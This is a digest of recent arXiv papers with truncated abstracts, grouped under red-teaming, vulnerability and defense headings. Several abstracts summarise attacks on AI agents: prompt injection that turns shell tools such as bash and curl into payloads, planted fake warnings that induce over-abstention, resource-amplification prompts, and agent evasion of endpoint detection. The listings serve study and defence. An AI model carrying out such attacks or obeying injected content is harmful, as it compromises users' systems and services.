- **2026-11-10** — Simon Hegelich, Bardh Prenkaj, Habiba Sarhan et al. — [From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses](http://arxiv.org/abs/2611.13960v1)
  <details><summary>📄 Abstract</summary>
  AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become the payload. We argue that security in agentic systems is a structural property of the cognitive architecture and permission composition rather than an emergent property of individual models. Static regex blacklists miss...
  </details>

- **2026-11-10** — Felix Härer — [Model-Based Authoring of SOC Simulation Exercises for Cybersecurity Education](http://arxiv.org/abs/2611.14227v1)
  <details><summary>📄 Abstract</summary>
  Cybersecurity training and classroom exercises with a virtual Security Operations Center (SOC) combine alerts, evidence, timeline entries, learner tasks, and assessment items that must remain consistent across an evolving incident. This paper presents a model-based authoring method in which a technical and educational specification is used to construct an incident exercise model and a large language model (LLM) generates selected scenario text based on that model. The incident exercise model com...
  </details>

- **2026-11-10** — Runxuan Tang, Haoyu Gao, Yuyan Ding et al. — [When Should Agents Remember? Falsification-Gated Self-Evolution for LLM Agents](http://arxiv.org/abs/2611.14326v1)
  <details><summary>📄 Abstract</summary>
  LLM agents increasingly operate in long-horizon, verifier-rich environments, but current self-improvement mechanisms often write episode-derived lessons directly into memory, making local success an unreliable signal for reusable and safe knowledge. This paper addresses the core question of when an experience-derived behavioral update should be admitted into persistent agent state. We propose Falsification-Gated Self-Evolution (FGSE), a verifier-grounded framework that represents each candidate ...
  </details>


### 📂 red-teaming
*红队测试 / Red Teaming* — 4 papers

- **2026-11-12** — Yang Zhou, Krish Agarwal, Zhuoming Chen et al. — [Singularity-Bench: Can Agents Build Agents?](http://arxiv.org/abs/2611.16591v1)
  <details><summary>📄 Abstract</summary>
  Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that are unreliable for evaluating arbitrary agent-generated systems. We introduce Singularity-Bench, an open-ended benchmark for autonomous AI development with six end-to-end tasks spanning pre-training, mid-training, post-tr...
  </details>

- **2026-11-12** — Zipeng Ye, Shenyu Dai, Yong Xie et al. — [ReA-Bench: Benchmarking Responsible Agent Auditing](http://arxiv.org/abs/2611.16493v1)
  <details><summary>📄 Abstract</summary>
  As agents perform tasks autonomously in local and cloud environments, auditing their execution trajectories can help service providers identify risks and improve agent harnesses and foundation models. Our analysis of production and red-team trajectories shows that some risks are repeatedly missed across auditing configurations. Overall recall obscures which risks are missed and whether higher recall comes with more false positives on legitimate behavior. Existing benchmarks offer limited insight...
  </details>

- **2026-11-12** — Nguyen Minh Thang — [Contain, Conform, Compare (Extended Version): A Red-Teamed Evaluation Kit for Small Coding Agents and the Full Record of Its Experiments](http://arxiv.org/abs/2611.16485v1)
  <details><summary>📄 Abstract</summary>
  A hosted score in the Gemma 4 Developer Agent competition is one noisy number, so development needs a local evaluator that is fast, safe for agent-written code, and matching the hosted scorer's prompts. drydock-eval evaluates a small coding agent (Gemma 4 E4B) at about 250 runs per hour on one RTX 5090. Contain runs each job in a fresh container without network and passed 200 scripted escape tests; conform provides eight checks that compare a local stack's requests with the scorer's configuratio...
  </details>

- **2026-11-10** — Howard Zhang, Chuck Arvin, Logan Brown et al. — [Comparative Analysis of Agent Evaluation Frameworks: Stability, Detection, and Discovery in Enterprise Analytics Agents](http://arxiv.org/abs/2611.14493v1)
  <details><summary>📄 Abstract</summary>
  Deploying LLM-based analytics agents in enterprise settings requires evaluation frameworks that can reliably detect failures across complex, multi-tool workflows. We present a three-phase comparative study of three evaluation frameworks, each representing a distinct evaluation paradigm (trace-based LLM judging, text-only LLM judging with red-teaming, and deterministic heuristics), applied to two analytics agents in a controlled research setting using frozen execution traces. Phase 1 quantifies e...
  </details>


### 📂 vulnerability
*漏洞与攻击面 / Vulnerabilities & Attack Surfaces* — 37 papers

- **2026-11-12** — Alexander H. Nitz, Keisi Kacanja, Collin D. Capano — [Peak Performance in Matched Filtering: Fused Correlation and Statistically Controlled Screening on CPUs and GPUs](http://arxiv.org/abs/2611.17229v1)
  <details><summary>📄 Abstract</summary>
  Batched matched filtering and cross-correlation over large template banks are a primary computational cost in gravitational-wave astronomy, seismology, and radio transient searches. Standard pipelines pair a general-purpose inverse Fast Fourier Transform (FFT) with separate multiplication and peak-finding kernels, writing intermediate spectra and full correlation series to memory for every template. We fuse the conjugate product into the first inverse-transform butterflies and the peak reduction...
  </details>

- **2026-11-12** — Zhezhen Cao, Weiyuan Ding, Bowen Xu — [Preserve the Vulnerability, Break the Alert: Testing the Robustness of CodeQL Taint Tracking with Natural Rewrites](http://arxiv.org/abs/2611.17123v1)
  <details><summary>📄 Abstract</summary>
  Static application security testing (SAST) tools such as CodeQL serve as security gates in continuous integration and code review, and a gate is also read in reverse. When a previously reported alert disappears after a change, developers and the tools around them often take the vulnerability to be gone. That inference holds only if the analyzer is robust to changes that keep the vulnerability. We test this robustness for CodeQL's JavaScript taint tracking with natural, vulnerability-preserving r...
  </details>

- **2026-11-12** — Ashvin Gupta, Brendan Delaney, Alessandra Russo — [Evaluating Pretrained Language Semantics for Structured EHR Prediction Tasks](http://arxiv.org/abs/2611.17053v1)
  <details><summary>📄 Abstract</summary>
  Structured Electronic Health Records (EHR) models typically treat each clinical concept as a dataset-specific token, discarding the natural-language semantics associated with the event. As a result, relationships between concepts must largely be learned from EHR co-occurrence, without directly exploiting any prior semantic knowledge. We investigate how pretrained causal language models can be adapted for longitudinal EHR prediction by developing tEHR. Here, we represent events with their natural...
  </details>

- **2026-11-12** — Wei Feng, Meiling Chen, Boxiao Chen et al. — [Reducing Batch Makespan for LLM Agent Workloads through Inference-Environment Coordination](http://arxiv.org/abs/2611.16661v1)
  <details><summary>📄 Abstract</summary>
  Efficient batch execution of agent tasks is critical to LLM training and development workflows, including benchmark evaluation, synthetic-data generation, and RL rollouts. Since these tasks alternate between LLM inference and environment interaction, we present coordinated optimizations to reduce batch makespan, the time required to complete all tasks in a batch. For hybrid LLMs, a workload-based resource model guides GPU-memory allocation between key-value (KV) cache and recurrent state and pro...
  </details>

- **2026-11-12** — Hung Nguyen-Huu, Nguyen Anh Tuan, Ting Zhang et al. — [CrossPloit: A Benchmark for Cross-Version PoC Migration in Python Web Applications](http://arxiv.org/abs/2611.16588v1)
  <details><summary>📄 Abstract</summary>
  Affected-version ranges in vulnerability databases decide which deployments scanners, patching pipelines, and incident responders treat as vulnerable, yet these ranges are often incomplete, so vulnerable releases are silently treated as safe. Auditing them requires executable evidence: given a proof-of-concept (PoC) exploit for a listed version, show that the same vulnerability can be triggered on an earlier, unlisted version. This cross-version PoC migration combines source-code analysis, envir...
  </details>

- **2026-11-12** — Shujie Duan, Jia Hong Puah, Haocheng Wu et al. — [Learning Temporal Dynamics with Derivative Representations for Time Series Forecasting](http://arxiv.org/abs/2611.16514v1)
  <details><summary>📄 Abstract</summary>
  Time series forecasting aims to predict the future evolution of complex systems by learning their underlying dynamics from past observations. Despite recent advances in deep learning, Transformers in particular still struggle to capture the temporal evolution of system dynamics. Existing approaches have been largely driven by architectural innovation, with comparatively little attention paid to training strategies that explicitly exploit the temporal structure governing system dynamics. In this ...
  </details>

- **2026-11-12** —  Euclid Collaboration, M. Ruffenach, M. Frailis et al. — [Euclid Data Release 1 (DR1). An overview of the Science Ground Segment architecture and operations](http://arxiv.org/abs/2611.16480v1)
  <details><summary>📄 Abstract</summary>
  The Euclid mission is designed to address fundamental questions on the nature of dark energy and dark matter by mapping the extragalactic sky with a wide-area survey complemented by targeted deep observations. The required scientific performance places stringent demands on the Euclid Science Ground Segment (SGS), which transforms raw telemetry into calibrated, validated, and scientifically exploitable products. The SGS is a distributed system comprising the Euclid Science Operations Centre, the ...
  </details>

- **2026-11-12** — Bojun Liu, Yangzhi Ma, Jie Li et al. — [SPEM: Scan-Prior Entropy Modeling for LiDAR Point Cloud Compression](http://arxiv.org/abs/2611.16212v1)
  <details><summary>📄 Abstract</summary>
  LiDAR point clouds exhibit scan-induced spatial regularities that are informative for geometry compression. Existing scan-aware approaches often exploit these regularities by transforming coded geometry into spherical or beam-aligned coordinate systems. However, this couples acquisition priors with geometry representation, altering spatial partitioning and quantization, and potentially preventing exact recovery of the original Cartesian geometry. We argue that acquisition priors should guide pro...
  </details>

- **2026-11-12** — Amin Mamandipoor, Connor Rudy Sullivan, Cole Ridge Strickler et al. — [SBA: A Practical Memory Performance Denial-of-Service Attack](http://arxiv.org/abs/2611.16189v1)
  <details><summary>📄 Abstract</summary>
  Modern cloud platforms use memory bandwidth regulation to isolate co-located workloads, implicitly assuming that high aggregate bandwidth consumption implies high interference. We show that this assumption is fundamentally flawed.   We present the Single-Bank Attack (SBA), a practical memory denial-of-service attack that induces extreme cross-core slowdowns---over three orders of magnitude on memory-intensive victims (e.g., LLM decode)---while consuming less than 1 GB/s of memory bandwidth. SBA ...
  </details>

- **2026-11-12** — Tahir Choulli, Ella Elazkany — [Novel Esscher concepts for informational risks and valuation in market models under random horizon](http://arxiv.org/abs/2611.16129v1)
  <details><summary>📄 Abstract</summary>
  This paper considers the setting constituted by the triplet $(S,\mathbb{F},τ)$. The pair $(S,\mathbb{F})$ is the initial model where $S$ is the discounted price process of risky assets (Stocks) and $\mathbb{F}$ is the ``public" flow of information that is available to all agents over time. $τ$ is an arbitrary random time, which might not be seen through the flow $\mathbb{F}$, and it represents a default time in credit risk and a death time of an insured in life insurance where mortality and/or l...
  </details>

- **2026-11-11** — Daiwei Zhu, Brendan Pankovich, Alireza Marefat Khah et al. — [Testing Quantum Advantage in High-Frequency Trading with Market-Derived Nonlocal Games](http://arxiv.org/abs/2611.16113v1)
  <details><summary>📄 Abstract</summary>
  Non-classical correlations enabled by entanglement could be exploited for distributed coordination tasks with communication constraints such as high-frequency trading in fragmented markets. However, previous studies have largely specified the game and its payoff structure theoretically, using toy market models without testing how well these models reflect observed market behavior. Here, we introduce market-derived nonlocal games, in which historical order-book data and backtests of joint actions...
  </details>

- **2026-11-11** — Ryan A. Anderson, Matthew Trager, Ben Bowman et al. — [Agentic Computational Algebra](http://arxiv.org/abs/2611.16073v1)
  <details><summary>📄 Abstract</summary>
  We explore the use of AI agents for solving computational problems in algebra. For the problems we consider, the main challenge is not correctness but \emph{time}: general-purpose algorithms are guaranteed to provide correct solutions but can be prohibitively slow, while reformulations that exploit special structure often allow solving a problem much faster. We propose to use this setting to evaluate how effectively agents discover and exploit structure within and across tasks to reduce computat...
  </details>

- **2026-11-11** — Sumanth Gudaparthi, Smeet Chheda, Ganesh Dasika — [Starscream: Reimagining LLM Sharding on AMD Instinct GPUs with GPU Partitioning](http://arxiv.org/abs/2611.15951v1)
  <details><summary>📄 Abstract</summary>
  As GPU accelerators grow larger to meet rising compute demands, they exhibit increasingly pronounced non-uniform memory access (NUMA) characteristics that challenge existing LLM frameworks. Chiplet-based architectures provide a practical path to larger GPUs while mitigating manufacturing yield constraints. Modern GPUs such as AMD Instinct MI300X employs such a multi-die design, and further offer GPU partitioning capabilities, partitioning a single physical GPU into multiple logical devices with ...
  </details>

- **2026-11-11** — Hu Li, Kenan Li, Haonan Xu et al. — [MORA: Correcting Time Series Forecasts with Coarse Future Signals](http://arxiv.org/abs/2611.15413v1)
  <details><summary>📄 Abstract</summary>
  Recent architectural advances have improved time-series forecasting. However, our analysis of forecasters with diverse architectures reveals a common pattern: a substantial share of residual energy is concentrated in a small number of low-frequency components. Simple linear probes further show that the forecasters' historical inputs still contain predictive information about errors in the forecast mean. Building on these findings, we propose Model-Output Residual Adaptation (MORA), a model-agnos...
  </details>

- **2026-11-11** — Qianxue Xia — [Agreement Is Not Assurance: Evidence-Independent Safety Gates for Agentic AI in DER-Rich Distribution Grids](http://arxiv.org/abs/2611.15363v1)
  <details><summary>📄 Abstract</summary>
  Physics-based safety gates for large language model (LLM) agents can approve unsafe actions when the agent and gate rely on the same corrupted measurements or network records. We formulate this shared-evidence failure for voltage-constrained distributed energy resource (DER) export decisions and analyze how nearly critical DER telemetry can bias state estimation while evading residual-based bad-data detection. We propose evidence-independent verification (EIV), which combines advanced metering i...
  </details>

- **2026-11-11** — Andrei Olar — [Beyond Symmetry: Asymmetric Matching with Transformers for Collective Entity Resolution](http://arxiv.org/abs/2611.15185v1)
  <details><summary>📄 Abstract</summary>
  A core assumption of entity resolution (ER) is its symmetric nature, which rests on a principle so self-evident it borders on tautology: if a refers to the same object as b, then b must also refer to the same object as a. However, this global property of symmetry does not necessarily extend to each of the complex decision processes within ER systems. In cases involving vague or ambiguous information, enforcing symmetry can be detrimental to performance, an issue exemplified by the ``bad triplet ...
  </details>

- **2026-11-11** — Aashish Pokhrel, Tejas Anvekar, Shivanand Venkanna Sheshappanavar — [Saying No by Asking Yes: Affirmative Decomposition and Evidence Reflection for Frozen CLIP](http://arxiv.org/abs/2611.15047v1)
  <details><summary>📄 Abstract</summary>
  Frozen vision-language models often match concepts mentioned in a caption without respecting their negation: a query "a kitchen with no toaster" favors an image containing a toaster. Yet these models are substantially stronger at matching affirmative descriptions. We exploit this asymmetry with Negation-Aware Evidence Scoring (NAES), which reformulates negated descriptions into affirmative queries and combines their evidence by caption structure. A lightweight text decomposer, NegSplit, identifi...
  </details>

- **2026-11-11** — Zhisheng Zhang, Yifan Mi, Yixuan Zhou et al. — [Speech Tokenizers are Vulnerable: Transferable Semantic Attack and Robust Tokenizer](http://arxiv.org/abs/2611.14929v1)
  <details><summary>📄 Abstract</summary>
  Speech tokenizers serve as speech front ends, encoding input speech signals into representations for downstream models, such as automatic speech recognition (ASR) systems and large audio-language models (LALMs). In this paper, we find that speech tokenizers are fragile at the semantic level: small perturbations can disrupt their semantic encoding process and consequently cause severe degradation in downstream ASR and LALM performance. To study this vulnerability, we propose T-SemAttack, a transf...
  </details>

- **2026-11-11** — Charles Xiao — [When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents](http://arxiv.org/abs/2611.14864v1)
  <details><summary>📄 Abstract</summary>
  An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe abstention requires evaluating both the claimed risk and the authority of the evidence supporting it. We develop controlled counterfactual task variants that vary risk content, source provenance, and warning wording, an...
  </details>

- **2026-11-10** — Ruiheng Yu, Oteo Mamo, Siyu Gan et al. — [OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design](http://arxiv.org/abs/2611.14808v1)
  <details><summary>📄 Abstract</summary>
  Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because the agent autonomously decides when to stop, a malicious tenant can send a prompt to the agent, exploiting its completion decisions to extend execution and waste provider resources. In this paper, we present OverServe, a m...
  </details>

- **2026-11-10** — Juming Xiong, Weixin Liu, Kevin Guo et al. — [RE-PRESENT: Evidence Triangulation across Alternative Candidate-Space Views for Efficient LLM Ensemble Inference](http://arxiv.org/abs/2611.14780v1)
  <details><summary>📄 Abstract</summary>
  Heterogeneous large language models (LLMs) exhibit complementary strengths, motivating routing and multi-model inference methods that seek to identify reliable predictions for each input. However, exploiting this complementarity remains challenging even when a correct prediction is available within the ensemble. We investigate this challenge across heterogeneous LLM ensembles and find that a simple single-round aggregation rule is highly competitive with learned routing methods, yet substantial ...
  </details>

- **2026-11-10** — Eve Fleisig, Joachim Baumann, Dylan Hadfield-Menell et al. — [Leaderboard Hacking: Preference-Based Model Evaluations are Vulnerable to Manipulation](http://arxiv.org/abs/2611.14769v1)
  <details><summary>📄 Abstract</summary>
  Arena-style rankings of language models are a widely used evaluation framework in online leaderboards, research papers, and model evaluation in production. These rankings aim to realistically assess model performance using pairwise comparisons of anonymous models on user prompts, aggregating votes via the Bradley-Terry model to produce the final ranking. However, we find that these leaderboards are highly vulnerable to several manipulation strategies that unscrupulous providers could use to boos...
  </details>

- **2026-11-10** — Jaiaid Mobin, Avinash Maurya, M. Mustafa Rafique et al. — [UniPipe: Unified Inference Serving and Fine-Tuning for Deadline-Constrained DNN Surrogate Workflows](http://arxiv.org/abs/2611.14748v1)
  <details><summary>📄 Abstract</summary>
  DNN surrogates are increasingly used to accelerate scientific workflows that must process high-rate sensor streams in near real time, exemplified by Ptychographic imaging at next-generation X-ray light sources. Such surrogates deliver 100-1000x higher throughput than iterative solvers, enabling faster steering of experiments. To preserve surrogate accuracy during an experiment, as the input distribution evolves, state-of-the-art deployments freeze the pretrained surrogate or run a separate CUDA ...
  </details>

- **2026-11-10** — Riana Gagnon Souleiman, Giovanni Beltrame — [Terrain-Aware Thompson Sampling for Multi-Drone Search and Rescue](http://arxiv.org/abs/2611.14685v1)
  <details><summary>📄 Abstract</summary>
  In this work, we propose a decentralized terrain-aware multi-drone Thompson Sampling algorithm tailored for search and rescue (SAR) applications. A probability distribution of locating a lost person is informed by terrain data, using established SAR models (displacement ring, elevation, watershed, dispersion angle, and track offset) derived from historical SAR case data on lost person behavior. Exploration is conducted by a team of drones using Thompson Sampling, where candidate actions are sele...
  </details>

- **2026-11-10** — Muhan Gao, Hangxiao Zhu, Xinqi Su et al. — [Re-Search: Dissecting LLM Ideation Through a Two-Player Questioning Game](http://arxiv.org/abs/2611.14487v1)
  <details><summary>📄 Abstract</summary>
  Research ideation is iterative: researchers refine their ideas step by step based on feedback. Yet existing evaluations obscure this search process, making it difficult to understand how LLMs explore the space of research ideas and what limits their progress. We introduce Re-Search, which adapts the format of Twenty Questions to research ideation: given only the research problem of a published paper, a model must rediscover the paper's core idea by asking yes-or-no questions. Built from 200 ICML...
  </details>

- **2026-11-10** — Karol Struniawski — [Breakdown of Autoregressive Multi-Step Reasoning Under Concentrated vs. Diffuse Attention Head Dropout](http://arxiv.org/abs/2611.14209v1)
  <details><summary>📄 Abstract</summary>
  During extended wakefulness, mammalian neocortical networks experience localized periods of transient neuronal silence termed off-states. Here, we examine how analogous spatiotemporally concentrated disruptions affect sequential reasoning in autoregressive Large Language Models (LLMs). Evaluating 250 paired derivations on the GSM8K benchmark across two 8B models (Qwen3-8B and LLaMA-3.1-8B-Instruct), we contrast clustered bursts of attention head masking against budget-matched diffuse i.i.d. drop...
  </details>

- **2026-11-10** — Haozhan Shen, Liangbo He, Jun Lan et al. — [ZoomGain: Mining Global-to-Zoom Perception Gaps for Fine-Grained Visual Supervision](http://arxiv.org/abs/2611.14076v1)
  <details><summary>📄 Abstract</summary>
  Fine-grained visual perception requires Vision-Language Models (VLMs) to locate and interpret subtle evidence within complex scenes. Constructing supervision for this ability is challenging: questions must have correct, unambiguous answers that depend on actual fine-grained visual details rather than coarse cues or language priors. Verifying these properties makes manual annotation labor-intensive and automatic generation difficult for models that themselves struggle with fine-grained perception...
  </details>

- **2026-11-10** — Jonas Limniatis, Bennet Schaarmann, Georg Reuber et al. — [Controlled Knowledge Engineering for Taxonomy Induction with Tool-Grounded LLM Agents and Runtime-Adaptive Policies](http://arxiv.org/abs/2611.13966v1)
  <details><summary>📄 Abstract</summary>
  Taxonomies are structured knowledge representations that support semantic search, recommendation, product catalog organization, and retrieval-augmented generation. Their automated construction from a fixed set of candidate entities requires more than plausible text generation: the resulting hierarchy must be complete, structurally valid, and semantically coherent. Large Language Models (LLMs) are promising for this task, but iterative free-form generation remains vulnerable to omitted or halluci...
  </details>

- **2026-11-10** — Suhas Chandrashekar, Thomas Stieglitz, Prasanth Velvaluri — [Design of Self-Folding Origami Architectures for Biomedical Implants: A Finite Element Simulation Framework](http://arxiv.org/abs/2611.13964v1)
  <details><summary>📄 Abstract</summary>
  Minimally invasive brain implants require compact deployment geometries and controlled shape transformation for delivery through confined vessels. Origami-inspired structures enable large shape changes from compact to tailored deployed configurations, but implementation at microscale dimensions remains challenging, as conventional designs rely on predefined mountain and valley folds that become increasingly difficult to fabricate and assemble as unit-cell size is reduced to meet clinical require...
  </details>

- **2026-11-10** — Weifeng Yuan, Zifan Chen, Yucheng Zhang et al. — [BypassGym: A Benchmark for Evaluating AI Agents' Endpoint Defense Evasion Capabilities](http://arxiv.org/abs/2611.13684v1)
  <details><summary>📄 Abstract</summary>
  Artificial intelligence agents increasingly automate cybersecurity tasks, including offensive operations. Frequent attacks across the web make endpoint detection and response (EDR) a critical defense, but whether AI agents can evade it remains unclear. Benchmarks evaluate the offensive capabilities of large language model (LLM) agents in areas such as penetration testing and vulnerability discovery. One important capability that these benchmarks do not address is defense evasion, specifically wh...
  </details>

- **2026-11-10** — Yue Wu, Xueyu Zhou, Yangrong Hu et al. — [Bootstrapped On-Policy Distillation](http://arxiv.org/abs/2611.13680v1)
  <details><summary>📄 Abstract</summary>
  On-policy distillation (OPD) improves language models by distilling teacher predictions on student-generated trajectories, while on-policy self-distillation (OPSD) removes the need for an external teacher by using a reference-conditioned copy of the model as the teacher. Despite its great early improvements, we find that OPSD does not remain consistently effective under continued training and can eventually suffer substantial performance degradation. We study this training behavior and link the ...
  </details>

- **2026-11-10** — Daniel Barter, Jacob C. Bridgeman, Chris Dawson et al. — [Machine-learning decoders for fusion-based quantum computing in real time](http://arxiv.org/abs/2611.13630v1)
  <details><summary>📄 Abstract</summary>
  Fault-tolerant quantum computation requires decoders that combine accuracy, throughput, low latency, and scalability to large numbers of physical qubits. In photonic fusion-based architectures, erasures from photon loss and probabilistic fusion measurements are a dominant error mechanism, motivating decoders that remain accurate at high erasure rates. We introduce PRISM, a transformer-based machine-learning decoder designed to exploit the known locations of erasures in protocols subject to both ...
  </details>

- **2026-11-10** — Aghoghomena Akasukpe, Li Yang, Xinyao Zhou et al. — [IFRS Compliance Verification: An Open Multi-LLM Benchmark and Content-Conditioned Ensemble Classifier](http://arxiv.org/abs/2611.13595v1)
  <details><summary>📄 Abstract</summary>
  Verifying corporate financial disclosures against the International Financial Reporting Standards (IFRS) is a core auditing task in which experts cross-reference disclosures with hundreds of fine-grained regulatory paragraphs: a laborious, costly, and error-prone process that motivates growing interest in large language models (LLMs) as compliance assistants. Yet single-model accuracy remains insufficient for high-stakes use, and naive ensembling is vulnerable to systematic per-model biases that...
  </details>

- **2026-11-10** — Zhiliang Chen, Sammy Nammari, Jiahao Su et al. — [Exploiting Feature-invariant Scaling Laws for Efficient A/B Experimentation in Recommendation Systems](http://arxiv.org/abs/2611.13539v1)
  <details><summary>📄 Abstract</summary>
  Researchers and engineers improve recommendation systems by performing A/B experiments with new model architectures, optimization methods, and data features. However, running full-scale experiments (e.g., full-model training with online data) for every feature change is prohibitively computationally intensive, while the result from a single small-scale experiment is often misleading. To address this challenge, we show that modern recommendation models exhibit feature-invariant scaling: the chang...
  </details>

- **2026-11-10** — Purva Pruthi, Andrew Yuan, Alexander D'Amour et al. — [Evaluating Compositional Generalization in Transformers: The Role of Composition Equivalence and Module Coverage](http://arxiv.org/abs/2611.13498v1)
  <details><summary>📄 Abstract</summary>
  Compositional generalization is an important form of out-of-distribution generalization, defined as the ability to train on some combinations of modules (e.g., functions such as sort, filter) and then generalize to unseen combinations. Despite substantial empirical work evaluating compositional generalization in transformers, findings have been inconsistent because evaluations were often conducted on a limited set of train-test splits, defined in an ad hoc manner. Through a systematic evaluation...
  </details>

- **2026-11-10** — Mo Zhou, Yiwei Zhang — [Framing-Induced Vulnerability in Large Language Models: Evidence from Chinese News Headlines](http://arxiv.org/abs/2611.13531v1)
  <details><summary>📄 Abstract</summary>
  Large language models increasingly evaluate, route, and moderate news, so a model's judgment of a headline has become a gatekeeping decision. We ask whether that judgment follows the fact being reported or the way the fact is framed. We combine an ecological audit of 63,926 Chinese news headlines with a controlled experiment. The experiment covers 30 real events, 30 synthetic events, and 29 natural headline pairs, tested on four Chinese models. Changing only the headline frame shifted both perce...
  </details>

- **2026-11-09** — Oshando Johnson, Ranjith Krishnamurthy, Rohith Kumar Shanmuganathan et al. — [Code-Grounded Agentic Explanations for Static Analysis Vulnerability Findings](http://arxiv.org/abs/2611.13041v1)
  <details><summary>📄 Abstract</summary>
  Static application security testing (SAST) tools surface vulnerabilities early and their verdicts are rule-based and auditable. Yet developers routinely dismiss findings they cannot interpret. Large language models can supply the missing explanation, but designs that also hand the model the detection give up the auditability that makes static analysis defensible. We keep detection with the analyser and give the model only the explaining. A preliminary user study with 20 participants and a worksh...
  </details>


### 📂 defense
*防御与防护方法 / Defense & Protection Methods* — 41 papers

- **2026-11-12** — Raghavendra Ramachandra, Hailin Li — [Validation-Guided Prompt Selection for Differential Morphing Attack Detection](http://arxiv.org/abs/2611.17176v1)
  <details><summary>📄 Abstract</summary>
  Differential morphing attack detection (D-MAD) compares a trusted live capture with a document image that may contain a facial morph. We investigate whether labelled validation data can improve a frozen-parameter vision-language evaluator through prompt selection rather than model fine-tuning. Version~1 generates 50 candidate prompts and selects the top-ranked instruction using a security-oriented loss that prioritises missed morph attacks (MACER) while accounting for bona fide classification er...
  </details>

- **2026-11-12** — Haozhe Wang, Lina Chen, Fanqi Wan et al. — [Metal Sandbox: Isolated Execution and Command Scheduling for GPU Coding Agents on Apple Silicon](http://arxiv.org/abs/2611.17294v1)
  <details><summary>📄 Abstract</summary>
  On-device inference requires kernels that make effective use of local accelerators. Efficient training and evaluation of models that generate Apple Metal kernels benefit from native macOS tools and concurrent agent sessions. These sessions alternate between model requests, development commands, and GPU execution, leaving GPU capacity idle for much of a rollout. We present Metal Sandbox, infrastructure that combines restricted per-instance file access, native command execution, and command-level ...
  </details>

- **2026-11-12** — Anit Upadhyaya, Ata Akbari Asanjan, Chaitanya Jalluri et al. — [SpotDiff: A Plug-and-Play Framework for Zero-Shot Change Detection in Remote Sensing Imagery](http://arxiv.org/abs/2611.17172v1)
  <details><summary>📄 Abstract</summary>
  Remote sensing change detection usually relies on large collections of temporally aligned, pixel-level annotations, which limits its scalability across regions, imaging platforms and application domains. Recent zero-shot approaches reduce the need for supervision, but they often localize fine-grained changes poorly because their features are coarse or inconsistent across time. We present SpotDiff, a training-free, plug-and-play framework for zero-shot change detection built by composing compleme...
  </details>

- **2026-11-12** — Alex Jiang, Didier Schwab, Chuyuan Li — [SPADE: Soft Prompts for Ai-text DEtection](http://arxiv.org/abs/2611.16929v1)
  <details><summary>📄 Abstract</summary>
  The easy access to Large Language Models (LLMs) has made AI-generated texts on the web increasingly ubiquitous, making AI-text detection a crucial task. Prompts greatly influence the generation process, but existing detectors focus solely on the generated texts --- supervised methods learn from labeled texts only, and zero-shot methods rely on the text's probability distributions --- ignoring the underlying generation process, which limits their robustness in open-world scenarios. We introduce S...
  </details>

- **2026-11-12** — Anna V. Guglielmi, Linda Senigagliesi, Marco Baldi et al. — [Game-Theoretic Analysis of RIS-Assisted Challenge-Response PLA - Part I: Perfect Channel Knowledge](http://arxiv.org/abs/2611.16557v1)
  <details><summary>📄 Abstract</summary>
  We consider a physical layer authentication scenario in which a legitimate user (Alice) communicates with an authen- ticator (Bob) through a reconfigurable intelligent surface (RIS), controlled by Bob. An attacker (Trudy) aims to impersonate Alice by suitably precoding her messages and still transmitting them through the RIS. This two-part study analyzes this attack-defense interaction between Bob and Trudy under perfect (Part I) and partial (Part II) channel knowledge by all the agents. Part I ...
  </details>

- **2026-11-12** — Aminu Yusuf, Shakeel Muhammad Ibrahim, Sulaimon Oyeniyi Adebayo et al. — [Context-Predictive Low-Rank Adaptation for Face Presentation Attack Detection](http://arxiv.org/abs/2611.16534v1)
  <details><summary>📄 Abstract</summary>
  Face presentation attack detection requires representations that distinguish physical spoofing cues across changes in acquisition devices, subjects, and attack media. Large visual encoders offer transferable representations, but conventional binary fine-tuning supervises their final decisions without explicitly constraining how local facial evidence is represented under partial observation. We present CP-JEPA, a context-predictive adaptation framework that combines low-rank tuning of a pretraine...
  </details>

- **2026-11-12** — Tamara Stojanovska, Elisabeth Kirsten, Leon Swazinna et al. — [Lost in Delegation: Studying the Effectiveness of Task Orchestration in Generative Search](http://arxiv.org/abs/2611.16526v1)
  <details><summary>📄 Abstract</summary>
  LLMs have quickly evolved from models used in isolation to agentic systems that delegate tasks to external tools and other LLMs to solve complex assignments. This agentic augmentation has led to impressive capability gains. However, when and how delegation improves performance remains poorly understood. For example, it is unclear whether delegation helps when tasks involve post-cutoff information that the orchestrating LLM cannot reliably resolve from its own knowledge. In this work, we use purp...
  </details>

- **2026-11-12** — Shib Dasgupta, Bandish Parikh, Rashmi Gangadharaiah — [CURATOR: Scalable Fine-grained Evidence Selection for Retrieval-Augmented Generation using Decision Models](http://arxiv.org/abs/2611.16366v1)
  <details><summary>📄 Abstract</summary>
  Retrieval-augmented generation (RAG) provides entire retrieved passages to the LLM, even though only a handful of spans within them contain the evidence pertaining to the question. While precise selection of these spans can improve context utilization, identifying them in isolation is challenging. A span may appear irrelevant by itself, and deciding whether to retain it may require examining other retrieved information. One can evaluate each span's candidacy with the full retrieved context, but ...
  </details>

- **2026-11-12** — Chenyang Liao, Chihang Luo, Xin Chen et al. — [Bright and Uniform Silicon Carbide Nanophotonic Arrays for Scalable Nanoscale Quantum Sensing](http://arxiv.org/abs/2611.16252v1)
  <details><summary>📄 Abstract</summary>
  Silicon carbide (SiC) spin defects are emerging as powerful platforms for nanoscale quantum sensing due to their near-surface stability, near-infrared emission, and CMOS compatibility. However, poor photon collection efficiency and the reliance on randomly distributed defects hinder the realization of practical, large-scale devices. Here, we demonstrate scalable, ultra-bright, and highly uniform SiC quantum nanophotonic arrays. By combining a self-aligned fabrication process with localized oxyge...
  </details>

- **2026-11-12** — Yongxiang Lei — [Climate Temporal Temperature Prediction via an Adaptive Stacked Bidirectional Residual Mamba Network](http://arxiv.org/abs/2611.16322v1)
  <details><summary>📄 Abstract</summary>
